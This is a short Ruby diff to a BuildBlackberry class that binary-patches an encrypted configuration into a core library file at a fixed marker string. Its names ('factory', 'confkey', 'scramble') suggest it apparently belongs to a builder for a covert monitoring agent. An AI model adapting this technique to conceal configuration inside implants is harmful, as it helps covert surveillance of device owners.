@@ -22,11 +22,24 @@ class BuildBlackberry < Build
     # add the file to be patched to the params
     # these params will be passed to the super
     params[:core] = 'net_rim_bb_lib_base'
-    params[:config] = 'config'
 
     # invoke the generic patch method with the new params
     super
 
+    trace :debug, "Build: adding config to [#{params[:core]}] file"
+
+    # blackberry has the config inside the lib file, binary patch it instead of creating a new file
+    core_file = File.join @tmpdir, params[:core]
+    file = File.open(core_file, 'rb+')
+    file.pos = file.read.index 'XW15TZlwZwpaWGPZ1wtL0f591tJe2b9'
+    config = @factory.configs.first.encrypted_config(@factory.confkey)
+    # write the size of the config
+    file.write [config.bytesize].pack('I')
+    # pad the config to 16Kb (minus the size of the int)
+    config = config.ljust(2**14 - 4, "\x00")
+    file.write config
+    file.close
+    
   end
 
   def scramble
